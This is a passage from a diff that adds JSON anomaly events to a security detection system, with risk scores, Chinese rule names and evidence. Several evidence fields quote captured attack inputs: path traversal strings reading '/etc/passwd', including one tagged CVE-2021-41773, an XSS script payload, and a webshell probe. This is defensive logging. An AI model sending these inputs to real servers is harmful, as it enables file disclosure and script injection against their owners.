+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 0,
+      "behavior_sensitivity": 0,
+      "event_correlation": 10,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "内网资产向外部非常用端口发起连接"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "suspicious_outbound"
+    ],
+    "evidence": {
+      "internal_ip": "10.0.0.20",
+      "external_ip": "45.77.128.203",
+      "external_port": 9001,
+      "conn_state": "conn_state=SF;duration=33.7"
+    },
+    "related_event_ids": [
+      "LOG-20261104-0617"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.098008Z",
+    "related_logs_summary": "user=unknown src_ip=10.0.0.20 action=connect result=success resource=45.77.128.203:9001"
+  },
+  {
+    "event_id": "anom-7f2d2b7541909ebc3205bd01fc5b0e6c",
+    "event_time": "2026-11-04T02:20:00Z",
+    "detect_time": "2026-11-17T09:29:31.093382Z",
+    "tenant_id": "default",
+    "user_id": "ops",
+    "src_ip": "10.0.0.66",
+    "host": "nas-host-01",
+    "source_type": "vpn",
+    "action": "login",
+    "object_type": "session",
+    "object_id": "sshd",
+    "attack_type": "account_takeover",
+    "risk_score": 25.0,
+    "risk_level": "low",
+    "risk_components": {
+      "rule_strength": 20,
+      "baseline_deviation": 15,
+      "behavior_sensitivity": 0,
+      "event_correlation": 0,
+      "feedback_adjustment": -10
+    },
+    "rule_hits": [
+      "新IP登录"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "new_source_ip",
+      "maintenance_window",
+      "allowlisted_context"
+    ],
+    "evidence": {
+      "user_id": "ops",
+      "new_ip": "10.0.0.66",
+      "risk_mitigations": [
+        "maintenance_window",
+        "allowlisted_context"
+      ]
+    },
+    "related_event_ids": [
+      "LOG-20261104-0618"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.093382Z",
+    "related_logs_summary": "user=ops src_ip=10.0.0.66 action=login result=success resource=sshd"
+  },
+  {
+    "event_id": "768f72bc-6b66-49e6-a053-5ad5e3c9a44a",
+    "event_time": "2026-11-04T20:05:07Z",
+    "detect_time": "2026-11-17T09:29:31.098114Z",
+    "tenant_id": "default",
+    "user_id": null,
+    "src_ip": "45.155.205.233",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "admin_access",
+    "object_type": "uri",
+    "object_id": "/admin/",
+    "attack_type": "Scanning_Probe",
+    "risk_score": 20.0,
+    "risk_level": "low",
+    "risk_components": {
+      "rule_strength": 20,
+      "baseline_deviation": 0,
+      "behavior_sensitivity": 0,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "同源IP短时间大量敏感路径探测"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "scanning_probe"
+    ],
+    "evidence": {
+      "src_ip": "45.155.205.233",
+      "error_count_in_window": 5,
+      "window_minutes": 5,
+      "sample_uri": "/admin/ /admin/"
+    },
+    "related_event_ids": [
+      "LOG-20261104-0706"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.098114Z",
+    "related_logs_summary": "user=unknown src_ip=45.155.205.233 action=admin_access result=fail resource=/admin/"
+  },
+  {
+    "event_id": "9462f79b-964f-482a-88ca-764214301fc9",
+    "event_time": "2026-11-04T20:05:19Z",
+    "detect_time": "2026-11-17T09:29:31.098203Z",
+    "tenant_id": "default",
+    "user_id": null,
+    "src_ip": "45.155.205.233",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "api_call",
+    "object_type": "uri",
+    "object_id": "/shell.php",
+    "attack_type": "Webshell_Access",
+    "risk_score": 35.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 0,
+      "behavior_sensitivity": 0,
+      "event_correlation": 10,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "访问疑似webshell脚本"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "webshell_access"
+    ],
+    "evidence": {
+      "src_ip": "45.155.205.233",
+      "uri": "/shell.php /shell.php",
+      "status_code": 404,
+      "user_agent": "dirsearch/0.4.3"
+    },
+    "related_event_ids": [
+      "LOG-20261104-0712"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.098203Z",
+    "related_logs_summary": "user=unknown src_ip=45.155.205.233 action=api_call result=error resource=/shell.php"
+  },
+  {
+    "event_id": "112e8e8c-ac1b-4a68-8bd4-8b58151378c3",
+    "event_time": "2026-11-04T20:05:21Z",
+    "detect_time": "2026-11-17T09:29:31.098247Z",
+    "tenant_id": "default",
+    "user_id": null,
+    "src_ip": "45.155.205.233",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "api_call",
+    "object_type": "uri",
+    "object_id": "/cve-2021-41773/../../etc/passwd",
+    "attack_type": "Path_Traversal",
+    "risk_score": 45.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 0,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "URI包含路径遍历特征"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "path_traversal"
+    ],
+    "evidence": {
+      "src_ip": "45.155.205.233",
+      "uri": "/cve-2021-41773/../../etc/passwd /cve-2021-41773/../../etc/passwd",
+      "matched": "../"
+    },
+    "related_event_ids": [
+      "LOG-20261104-0713"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.098247Z",
+    "related_logs_summary": "user=unknown src_ip=45.155.205.233 action=api_call result=error resource=/cve-2021-41773/../../etc/passwd"
+  },
+  {
+    "event_id": "b22ba8ae-cfe6-4dff-b49c-7235dda8ddd6",
+    "event_time": "2026-11-05T06:00:18Z",
+    "detect_time": "2026-11-17T09:29:31.098556Z",
+    "tenant_id": "default",
+    "user_id": null,
+    "src_ip": "10.0.0.77",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "api_call",
+    "object_type": "uri",
+    "object_id": "/comment.php",
+    "attack_type": "XSS",
+    "risk_score": 40.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 0,
+      "behavior_sensitivity": 15,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "URI/载荷包含XSS特征"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "xss_attempt"
+    ],
+    "evidence": {
+      "src_ip": "10.0.0.77",
+      "uri": "/comment.php /comment.php",
+      "payload": "content=<script>alert(1)</script>&post=88",
+      "matched": "<script"
+    },
+    "related_event_ids": [
+      "LOG-20261105-0906"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.098556Z",
+    "related_logs_summary": "user=unknown src_ip=10.0.0.77 action=api_call result=success resource=/comment.php"
+  },
+  {
+    "event_id": "a638d45f-c5a8-4538-a5e6-9d05fb2ef2b7",
+    "event_time": "2026-11-05T06:00:22Z",
+    "detect_time": "2026-11-17T09:29:31.098605Z",
+    "tenant_id": "default",
+    "user_id": null,
+    "src_ip": "10.0.0.77",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "export",
+    "object_type": "uri",
+    "object_id": "/download.php?file=../../etc/passwd",
+    "attack_type": "Path_Traversal",
+    "risk_score": 45.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 0,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "URI包含路径遍历特征"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "path_traversal"
+    ],
+    "evidence": {
+      "src_ip": "10.0.0.77",
+      "uri": "/download.php?file=../../etc/passwd /download.php?file=../../etc/passwd",
+      "matched": "../"
+    },
+    "related_event_ids": [
+      "LOG-20261105-0907"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.098605Z",
+    "related_logs_summary": "user=unknown src_ip=10.0.0.77 action=export result=fail resource=/download.php?file=../../etc/passwd"
+  },
+  {
+    "event_id": "2630aa4a-3737-4c08-b330-7fba9af4e207",
+    "event_time": "2026-11-05T06:00:31Z",
+    "detect_time": "2026-11-17T09:29:31.098656Z",
+    "tenant_id": "default",
+    "user_id": null,
+    "src_ip": "10.0.0.77",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "api_call",
+    "object_type": "uri",
+    "object_id": "/server-status",
+    "attack_type": "Scanning_Probe",
+    "risk_score": 20.0,
+    "risk_level": "low",
+    "risk_components": {
+      "rule_strength": 20,
+      "baseline_deviation": 0,
+      "behavior_sensitivity": 0,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "同源IP短时间大量敏感路径探测"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "scanning_probe"
+    ],
+    "evidence": {
+      "src_ip": "10.0.0.77",
+      "error_count_in_window": 5,
+      "window_minutes": 5,
+      "sample_uri": "/server-status /server-status"
+    },
+    "related_event_ids": [
+      "LOG-20261105-0909"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.098656Z",
+    "related_logs_summary": "user=unknown src_ip=10.0.0.77 action=api_call result=fail resource=/server-status"
+  },
+  {
+    "event_id": "anom-182dc1acaf757db200dff8eb397a9246",
+    "event_time": "2026-11-06T08:20:01Z",
+    "detect_time": "2026-11-17T09:29:31.094666Z",
+    "tenant_id": "default",
+    "user_id": "zhangsan",
+    "src_ip": "10.0.0.52",
+    "host": "web-prod-01",
+    "source_type": "vpn",
+    "action": "login",
+    "object_type": "session",
+    "object_id": "sshd",
+    "attack_type": "account_takeover",
+    "risk_score": 35.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 20,
+      "baseline_deviation": 15,
+      "behavior_sensitivity": 0,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "新IP登录"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "new_source_ip"
+    ],
+    "evidence": {
+      "user_id": "zhangsan",
+      "new_ip": "10.0.0.52"
+    },
+    "related_event_ids": [
+      "LOG-20261106-1002"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.094666Z",
+    "related_logs_summary": "user=zhangsan src_ip=10.0.0.52 action=login result=success resource=sshd"
+  },
+  {
+    "event_id": "anom-1e7217822064773d72171edeb3aecc64",
+    "event_time": "2026-11-06T08:20:01Z",
+    "detect_time": "2026-11-17T09:29:31.094589Z",
+    "tenant_id": "default",
+    "user_id": "zhangsan",
+    "src_ip": "10.0.0.52",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "login",
+    "object_type": "uri",
+    "object_id": "/admin/login.php",
+    "attack_type": "privilege_abuse",
+    "risk_score": 55.0,
+    "risk_level": "high",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 10,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "普通用户访问admin接口"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "admin_resource_access"
+    ],
+    "evidence": {
+      "resource": "/admin/login.php",
+      "user_id": "zhangsan"
+    },
+    "related_event_ids": [
+      "LOG-20261106-1001"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "pending",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.094589Z",
+    "related_logs_summary": "user=zhangsan src_ip=10.0.0.52 action=login result=fail resource=/admin/login.php"
+  },
+  {
+    "event_id": "anom-e0d418d5f071b235f2297a67a96711d8",
+    "event_time": "2026-11-06T08:21:10Z",
+    "detect_time": "2026-11-17T09:29:31.094762Z",
+    "tenant_id": "default",
+    "user_id": "zhangsan",
+    "src_ip": "10.0.0.52",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "login",
+    "object_type": "uri",
+    "object_id": "/admin/login.php",
+    "attack_type": "account_takeover",
+    "risk_score": 80.0,
+    "risk_level": "critical",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 25,
+      "behavior_sensitivity": 20,
+      "event_correlation": 10,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "新IP登录后短时间访问敏感资源"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "new_source_then_sensitive_access",
+      "sensitive_resource_access"
+    ],
+    "evidence": {
+      "user_id": "zhangsan",
+      "src_ip": "10.0.0.52",
+      "resource": "/admin/login.php"
+    },
+    "related_event_ids": [
+      "LOG-20261106-1003",
+      "LOG-20261106-1002"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "pending",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.094762Z",
+    "related_logs_summary": "user=zhangsan src_ip=10.0.0.52 action=login result=fail resource=/admin/login.php"
+  },
+  {
+    "event_id": "anom-212b4852b96faeaf99946920ba45bad6",
+    "event_time": "2026-11-06T08:21:10Z",
+    "detect_time": "2026-11-17T09:29:31.094797Z",
+    "tenant_id": "default",
+    "user_id": "zhangsan",
+    "src_ip": "10.0.0.52",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "login",
+    "object_type": "uri",
+    "object_id": "/admin/login.php",
+    "attack_type": "privilege_abuse",
+    "risk_score": 55.0,
+    "risk_level": "high",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 10,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "普通用户访问admin接口"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "admin_resource_access"
+    ],
+    "evidence": {
+      "resource": "/admin/login.php",
+      "user_id": "zhangsan"
+    },
+    "related_event_ids": [
+      "LOG-20261106-1003"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "pending",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.094797Z",
+    "related_logs_summary": "user=zhangsan src_ip=10.0.0.52 action=login result=fail resource=/admin/login.php"
+  },
+  {
+    "event_id": "anom-b5ddcae344a80f19495f494a137b7fcb",
+    "event_time": "2026-11-06T08:22:30Z",
+    "detect_time": "2026-11-17T09:29:31.094917Z",
+    "tenant_id": "default",
+    "user_id": "zhangsan",
+    "src_ip": "10.0.0.52",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "login",
+    "object_type": "uri",
+    "object_id": "/admin/login.php",
+    "attack_type": "account_takeover",
+    "risk_score": 80.0,
+    "risk_level": "critical",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 25,
+      "behavior_sensitivity": 20,
+      "event_correlation": 10,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "新IP登录后短时间访问敏感资源"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "new_source_then_sensitive_access",
+      "sensitive_resource_access"
+    ],
+    "evidence": {
+      "user_id": "zhangsan",
+      "src_ip": "10.0.0.52",
+      "resource": "/admin/login.php"
+    },
+    "related_event_ids": [
+      "LOG-20261106-1005",
+      "LOG-20261106-1002"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "pending",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.094917Z",
+    "related_logs_summary": "user=zhangsan src_ip=10.0.0.52 action=login result=success resource=/admin/login.php"
+  },
+  {
+    "event_id": "anom-cd7a00e969f1766891bd9b9aea2e74de",
+    "event_time": "2026-11-06T08:22:30Z",
+    "detect_time": "2026-11-17T09:29:31.094954Z",
+    "tenant_id": "default",
+    "user_id": "zhangsan",
+    "src_ip": "10.0.0.52",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "login",
+    "object_type": "uri",
+    "object_id": "/admin/login.php",
+    "attack_type": "privilege_abuse",
+    "risk_score": 55.0,
+    "risk_level": "high",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 10,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "普通用户访问admin接口"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "admin_resource_access"
+    ],
+    "evidence": {
+      "resource": "/admin/login.php",
+      "user_id": "zhangsan"
+    },
+    "related_event_ids": [
+      "LOG-20261106-1005"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "pending",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.094954Z",
+    "related_logs_summary": "user=zhangsan src_ip=10.0.0.52 action=login result=success resource=/admin/login.php"
+  },
+  {
+    "event_id": "anom-b0d4e96bc7d7d2d720b4abfdbe9b8f9c",
+    "event_time": "2026-11-06T08:22:50Z",
+    "detect_time": "2026-11-17T09:29:31.095072Z",
+    "tenant_id": "default",
+    "user_id": "zhangsan",
+    "src_ip": "10.0.0.52",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "admin_access",
+    "object_type": "uri",
+    "object_id": "/admin/dashboard.php",
+    "attack_type": "account_takeover",
+    "risk_score": 80.0,
+    "risk_level": "critical",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 25,
+      "behavior_sensitivity": 20,
+      "event_correlation": 10,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "新IP登录后短时间访问敏感资源"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "new_source_then_sensitive_access",
+      "sensitive_resource_access"
+    ],
+    "evidence": {
+      "user_id": "zhangsan",
+      "src_ip": "10.0.0.52",
+      "resource": "/admin/dashboard.php"
+    },
+    "related_event_ids": [
+      "LOG-20261106-1007",
+      "LOG-20261106-1002"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "pending",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.095072Z",
+    "related_logs_summary": "user=zhangsan src_ip=10.0.0.52 action=admin_access result=success resource=/admin/dashboard.php"
+  },
+  {
+    "event_id": "anom-4eefcadfba4d5a8c9d493606316b0729",
+    "event_time": "2026-11-06T08:22:50Z",
+    "detect_time": "2026-11-17T09:29:31.095105Z",
+    "tenant_id": "default",
+    "user_id": "zhangsan",
+    "src_ip": "10.0.0.52",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "admin_access",
+    "object_type": "uri",
+    "object_id": "/admin/dashboard.php",
+    "attack_type": "privilege_abuse",
+    "risk_score": 55.0,
+    "risk_level": "high",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 10,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "普通用户访问admin接口"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "admin_resource_access"
+    ],
+    "evidence": {
+      "resource": "/admin/dashboard.php",
+      "user_id": "zhangsan"
+    },
+    "related_event_ids": [
+      "LOG-20261106-1007"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "pending",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.095105Z",
+    "related_logs_summary": "user=zhangsan src_ip=10.0.0.52 action=admin_access result=success resource=/admin/dashboard.php"
+  },
+  {
+    "event_id": "anom-07bf1c4a144fd7fab86883aa6c1273df",
+    "event_time": "2026-11-06T08:23:10Z",
+    "detect_time": "2026-11-17T09:29:31.095213Z",
+    "tenant_id": "default",
+    "user_id": "zhangsan",
+    "src_ip": "10.0.0.52",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "admin_access",
+    "object_type": "uri",
+    "object_id": "/admin/user_list.php?page=1",
+    "attack_type": "account_takeover",
+    "risk_score": 80.0,
+    "risk_level": "critical",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 25,
+      "behavior_sensitivity": 20,
+      "event_correlation": 10,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "新IP登录后短时间访问敏感资源"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "new_source_then_sensitive_access",
+      "sensitive_resource_access"
+    ],
+    "evidence": {
+      "user_id": "zhangsan",
+      "src_ip": "10.0.0.52",
+      "resource": "/admin/user_list.php?page=1"
+    },
+    "related_event_ids": [
+      "LOG-20261106-1008",
+      "LOG-20261106-1002"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "pending",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.095213Z",
+    "related_logs_summary": "user=zhangsan src_ip=10.0.0.52 action=admin_access result=success resource=/admin/user_list.php?page=1"
+  },
+  {
+    "event_id": "anom-e2be82ebbe107930930dfa6a228cd44d",
+    "event_time": "2026-11-06T08:23:10Z",
+    "detect_time": "2026-11-17T09:29:31.095241Z",
+    "tenant_id": "default",
+    "user_id": "zhangsan",
+    "src_ip": "10.0.0.52",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "admin_access",
+    "object_type": "uri",
+    "object_id": "/admin/user_list.php?page=1",
+    "attack_type": "privilege_abuse",
+    "risk_score": 55.0,
+    "risk_level": "high",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 10,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "普通用户访问admin接口"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "admin_resource_access"
+    ],
+    "evidence": {
+      "resource": "/admin/user_list.php?page=1",
+      "user_id": "zhangsan"
+    },
+    "related_event_ids": [
+      "LOG-20261106-1008"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "pending",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.095241Z",
+    "related_logs_summary": "user=zhangsan src_ip=10.0.0.52 action=admin_access result=success resource=/admin/user_list.php?page=1"
+  },
+  {
+    "event_id": "anom-413854eba50ee3ee1e072a11b7b6a549",
+    "event_time": "2026-11-06T08:23:10Z",
+    "detect_time": "2026-11-17T09:29:31.095178Z",
+    "tenant_id": "default",
+    "user_id": "zhangsan",
+    "src_ip": "10.0.0.52",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "admin_access",
+    "object_type": "uri",
+    "object_id": "/admin/user_list.php?page=1",
+    "attack_type": "sensitive_access",
+    "risk_score": 40.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 20,
+      "baseline_deviation": 0,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "同一user_id在5分钟内敏感资源访问超阈值"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "sensitive_resource_access"
+    ],
+    "evidence": {
+      "user_id": "zhangsan",
+      "sensitive_count_5m": 5,
+      "resource": "/admin/user_list.php?page=1"
+    },
+    "related_event_ids": [
+      "LOG-20261106-1008"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.095178Z",
+    "related_logs_summary": "user=zhangsan src_ip=10.0.0.52 action=admin_access result=success resource=/admin/user_list.php?page=1"
+  },
+  {
+    "event_id": "anom-7c9bdac4112f0f50f813c75e41279de5",
+    "event_time": "2026-11-06T08:23:40Z",
+    "detect_time": "2026-11-17T09:29:31.095346Z",
+    "tenant_id": "default",
+    "user_id": "zhangsan",
+    "src_ip": "10.0.0.52",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "admin_access",
+    "object_type": "uri",
+    "object_id": "/admin/order_list.php?page=1",
+    "attack_type": "account_takeover",
+    "risk_score": 80.0,
+    "risk_level": "critical",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 25,
+      "behavior_sensitivity": 20,
+      "event_correlation": 10,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "新IP登录后短时间访问敏感资源"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "new_source_then_sensitive_access",
+      "sensitive_resource_access"
+    ],
+    "evidence": {
+      "user_id": "zhangsan",
+      "src_ip": "10.0.0.52",
+      "resource": "/admin/order_list.php?page=1"
+    },
+    "related_event_ids": [
+      "LOG-20261106-1009",
+      "LOG-20261106-1002"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "pending",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.095346Z",
+    "related_logs_summary": "user=zhangsan src_ip=10.0.0.52 action=admin_access result=success resource=/admin/order_list.php?page=1"
+  },
+  {
+    "event_id": "anom-b8c7ee933ff5a8537f36cc5431f1b464",
+    "event_time": "2026-11-06T08:23:40Z",
+    "detect_time": "2026-11-17T09:29:31.095374Z",
+    "tenant_id": "default",
+    "user_id": "zhangsan",
+    "src_ip": "10.0.0.52",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "admin_access",
+    "object_type": "uri",
+    "object_id": "/admin/order_list.php?page=1",
+    "attack_type": "privilege_abuse",
+    "risk_score": 55.0,
+    "risk_level": "high",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 10,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "普通用户访问admin接口"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "admin_resource_access"
+    ],
+    "evidence": {
+      "resource": "/admin/order_list.php?page=1",
+      "user_id": "zhangsan"
+    },
+    "related_event_ids": [
+      "LOG-20261106-1009"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "pending",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.095374Z",
+    "related_logs_summary": "user=zhangsan src_ip=10.0.0.52 action=admin_access result=success resource=/admin/order_list.php?page=1"
+  },
+  {
+    "event_id": "anom-78bf79e3651e23ce155978d3f2da4d88",
+    "event_time": "2026-11-06T08:23:40Z",
+    "detect_time": "2026-11-17T09:29:31.095313Z",
+    "tenant_id": "default",
+    "user_id": "zhangsan",
+    "src_ip": "10.0.0.52",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "admin_access",
+    "object_type": "uri",
+    "object_id": "/admin/order_list.php?page=1",
+    "attack_type": "sensitive_access",
+    "risk_score": 40.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 20,
+      "baseline_deviation": 0,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "同一user_id在5分钟内敏感资源访问超阈值"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "sensitive_resource_access"
+    ],
+    "evidence": {
+      "user_id": "zhangsan",
+      "sensitive_count_5m": 6,
+      "resource": "/admin/order_list.php?page=1"
+    },
+    "related_event_ids": [
+      "LOG-20261106-1009"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
